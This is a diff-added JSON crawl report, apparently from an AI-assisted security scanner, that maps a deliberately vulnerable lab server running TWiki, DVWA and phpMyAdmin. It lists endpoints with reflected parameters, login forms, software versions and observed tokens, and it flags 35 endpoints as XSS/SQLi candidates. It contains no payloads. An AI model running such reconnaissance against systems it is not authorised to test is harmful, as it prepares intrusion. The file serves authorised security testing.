+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Main/WebIndex",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Main/WebPreferences",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Main/WebPreferences",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Main/WebPreferences",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Main/WebSearch",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Main/WebSearch",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Main/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebChanges",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebChanges",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebChanges",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebHome",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebHome",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebPreferences",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebPreferences",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebPreferences",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebSearch",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebSearch",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/TWiki/StartingPoints",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/TWiki/StartingPoints",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/StartingPoints",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/TWiki/TWikiRegistration",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/TWiki/TWikiRegistration",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/TWikiRegistration",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebChanges",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebChanges",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebChanges",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebHome",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebHome",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebPreferences",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebPreferences",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebPreferences",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebSearch",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebSearch",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WelcomeGuest",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/TWiki/WelcomeGuest",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WelcomeGuest",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/license.txt",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/plain",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "Copyright and License of TWiki, 01 Feb 2003 ------------------------------------------- TWiki (TM) is copyrighted (C) 1999-2003 by Peter Thoeny, Peter@Thoeny.com; ALL RIGHTS RESERVED. TWiki's core tea",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/readme.txt",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/plain",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "TWiki (TM) - A Web Based Collaboration Platform =============================================== TWiki Distribution ------------------ Version: 01 Feb 2003 Release type: Production release What is TWik",
+      "notes": "AI-directed path: Exposed plain text readme file providing version information."
+    },
+    {
+      "url": "https://server.vulnapp.id/var/www/mutillidae/classes/LogHandler.php",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/var/www/mutillidae/documentation/vulnerabilities.php",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/var/www/mutillidae/index.php",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/var/www/mutillidae/process-commands.php",
+      "method": "GET",
+      "params": [],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/version",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/view/TWiki/TWikiHistory?rev=1.9",
+      "method": "GET",
+      "params": [
+        {
+          "name": "rev",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "1.9"
+          ],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /view/TWiki/TWikiHistory was not found on this server",
+      "notes": null
+    }
+  ],
+  "auth": {
+    "login_candidates": [
+      "POST https://server.vulnapp.id/phpMyAdmin/index.php",
+      "POST http://TWiki.org/cgi-bin/passwd/TWiki/WebHome",
+      "POST http://TWiki.org/cgi-bin/passwd/Main/WebHome"
+    ],
+    "login_forms": [
+      {
+        "action": "https://server.vulnapp.id/phpMyAdmin/index.php",
+        "method": "POST",
+        "fields": [
+          "phpMyAdmin",
+          "phpMyAdmin",
+          "pma_username",
+          "pma_password",
+          "server",
+          "phpMyAdmin",
+          "lang",
+          "convcharset",
+          "token"
+        ],
+        "field_types": {
+          "phpMyAdmin": "hidden",
+          "pma_username": "text",
+          "pma_password": "password",
+          "server": "hidden",
+          "lang": "hidden",
+          "convcharset": "hidden",
+          "token": "hidden"
+        },
+        "hidden_values": {
+          "phpMyAdmin": "2b9ab06833d8371f2429b72851c4d42eb64f1c84",
+          "server": "1",
+          "lang": "en-utf-8",
+          "convcharset": "utf-8",
+          "token": "98f06e7b5cf3ba11429845a2b952d340"
+        },
+        "page_url": "https://server.vulnapp.id/phpMyAdmin/",
+        "has_password_field": true,
+        "likely_login": true
+      },
+      {
+        "action": "http://TWiki.org/cgi-bin/passwd/TWiki/WebHome",
+        "method": "POST",
+        "fields": [
+          "username",
+          "oldpassword",
+          "password",
+          "passwordA",
+          "TopicName",
+          "change"
+        ],
+        "field_types": {
+          "username": "text",
+          "oldpassword": "password",
+          "password": "password",
+          "passwordA": "password",
+          "TopicName": "hidden",
+          "change": "hidden"
+        },
+        "hidden_values": {
+          "TopicName": "ChangePassword",
+          "change": "on"
+        },
+        "page_url": "https://server.vulnapp.id/twiki/TWikiDocumentation.html",
+        "has_password_field": true,
+        "likely_login": true
+      },
+      {
+        "action": "http://TWiki.org/cgi-bin/passwd/Main/WebHome",
+        "method": "POST",
+        "fields": [
+          "username",
+          "password",
+          "passwordA",
+          "TopicName"
+        ],
+        "field_types": {
+          "username": "text",
+          "password": "password",
+          "passwordA": "password",
+          "TopicName": "hidden"
+        },
+        "hidden_values": {
+          "TopicName": "ResetPassword"
+        },
+        "page_url": "https://server.vulnapp.id/twiki/TWikiDocumentation.html",
+        "has_password_field": true,
+        "likely_login": true
+      }
+    ],
+    "token_type": null,
+    "token_storage": null,
+    "authenticated": false,
+    "login_strategy": null,
+    "session_cookie_names": [],
+    "jwt_sample_claims": null,
+    "protected_endpoints": []
+  },
+  "technologies": [
+    {
+      "name": "nginx",
+      "category": "server",
+      "source": "header",
+      "evidence": "server: nginx/1.24.0 (Ubuntu)"
+    },
+    {
+      "name": "PHP",
+      "category": "language",
+      "source": "header",
+      "evidence": "x-powered-by: PHP/5.2.4-2ubuntu5.10"
+    },
+    {
+      "name": "DVWA",
+      "category": "app",
+      "source": "body",
+      "evidence": "dvwa"
+    },
+    {
+      "name": "jQuery",
+      "category": "library",
+      "source": "body",
+      "evidence": "jquery.min.js"
+    },
+    {
+      "name": "cookie: set-cookie",
+      "category": "cookie",
+      "source": "cookie",
+      "evidence": "phpMyAdmin=2b9ab06833d8371f2429b72851c4d42eb64f1c84"
+    }
+  ],
+  "stats": {
+    "pages_crawled": 60,
+    "unique_urls_seen": 96,
+    "requests_made": 177,
+    "scope_blocked": 52,
+    "errors": 0,
+    "duration_seconds": 146.36,
+    "playwright_used": true,
+    "katana_used": true,
+    "authenticated_pass": false
+  },
+  "notes": [
+    "Katana discovered 41 in-scope endpoint(s)",
+    "AI planning nominated 8 path(s); 8 safe GET target(s) fetched",
+    "no credentials supplied — authenticated surface not crawled",
+    "3 distinct cookie(s) observed",
+    "35 endpoint(s) reflect parameter values (XSS/SQLi candidates)"
+  ]
+}
